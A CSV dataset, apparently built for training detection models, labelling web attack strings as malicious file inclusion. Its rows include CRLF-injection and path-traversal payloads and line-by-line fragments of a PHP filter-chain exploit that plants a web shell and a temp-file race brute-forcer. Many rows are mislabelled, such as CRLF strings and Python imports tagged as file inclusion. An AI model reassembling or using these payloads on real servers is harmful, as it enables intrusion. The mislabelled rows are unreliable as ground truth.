Payload,Signature,AttackType,Severity,MITRE,Label,Description
"      burp0_headers = {""NSC_USER"": ""../../../../netscaler/portal/templates/"" +",File Inclusion,File Inclusion,High,T1190,Malicious,File Inclusion payload from comprehensive dataset
"      burp0_headers = {""NSC_USER"": ""../../../../netscaler/portal/templates/"" +",File Inclusion,File Inclusion,High,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%%0a0aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%0aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%0d%0aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%0dSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%23%0aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%23%0d%0aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%23%0dSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%25%30%61Set-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%25%30aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%250aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%25250aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%2F..%0d%0aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%3f%0d%0aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%3f%0dSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
/%u000aSet-Cookie:crlf=injection,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"        'Path': 'file:///' + temp_target_folder.replace('\\', '/') + '/' + filename_remote",File Inclusion,File Inclusion,High,T1190,Malicious,File Inclusion payload from comprehensive dataset
",File Inclusion,File Inclusion,Critical,T1190,Malicious,File Inclusion payload from comprehensive dataset
",File Inclusion,File Inclusion,Critical,T1190,Malicious,File Inclusion payload from comprehensive dataset
",File Inclusion,File Inclusion,Critical,T1190,Malicious,File Inclusion payload from comprehensive dataset
import requests,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
url = """"http://localhost:8000/chall.php""""""",File Inclusion,File Inclusion,Medium,T1190,Malicious,File Inclusion payload from comprehensive dataset
"command = ""id""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
#<?=`$_GET[0]`;;?>,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"base64_payload = ""PD89YCRfR0VUWzBdYDs7Pz4""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
conversions = {,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'C': 'convert.iconv.UTF8.CSISO2022KR',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2',File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
},File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
# generate some garbage base64,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"filters = ""convert.iconv.UTF8.CSISO2022KR|""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"filters += ""convert.base64-encode|""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"filters += ""convert.iconv.UTF8.UTF7|""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
for c in base64_payload[::-1]:,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"        filters += conversions[c] + ""|""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
        # decode and re-encode to get rid of everything that isn't valid base64,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"        filters += ""convert.base64-decode|""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"        filters += ""convert.base64-encode|""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
        # get rid of equal signs,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"        filters += ""convert.iconv.UTF8.UTF7|""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"filters += ""convert.base64-decode""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"final_payload = f""php://filter/{filters}/resource={file_to_use}""",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"with open('payload', 'w') as f:",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
    f.write(final_payload),File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"r = requests.get(url, params={",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    ""0"": command,",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    ""action"": ""include"",",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    ""file"": final_payload",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
}),File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
print(r.text),File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
from __future__ import print_function,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
from builtins import range,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
import itertools,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
import requests,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
import string,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
import sys,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
print('[+] Trying to win the race'),File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"f = {'file': open('shell.php', 'rb')}",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
for _ in range(4096 * 4096):,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"    requests.post('http://target.com/index.php?c=index.php', f)",File Inclusion,File Inclusion,Medium,T1190,Malicious,File Inclusion payload from comprehensive dataset
print('[+] Bruteforcing the inclusion'),File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"for fname in itertools.combinations(string.ascii_letters + string.digits, 6):",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
    url = 'http://target.com/index.php?c=/tmp/php' + fname,File Inclusion,File Inclusion,Medium,T1190,Malicious,File Inclusion payload from comprehensive dataset
    r = requests.get(url),File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
    if 'load average' in r.text:  # <?php echo system('uptime');,File Inclusion,File Inclusion,Critical,T1190,Malicious,File Inclusion payload from comprehensive dataset
        print('[+] We have got a shell: ' + url),File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
        sys.exit(0),File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
"print('[x] Something went wrong, please try again')",File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
../,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
../../,File Inclusion,File Inclusion,Low,T1190,Malicious,File Inclusion payload from comprehensive dataset
../../../,File Inclusion,File Inclusion,High,T1190,Malicious,File Inclusion payload from comprehensive dataset
../../../../,File Inclusion,File Inclusion,High,T1190,Malicious,File Inclusion payload from comprehensive dataset
../../../../../,File Inclusion,File Inclusion,High,T1190,Malicious,File Inclusion payload from comprehensive dataset
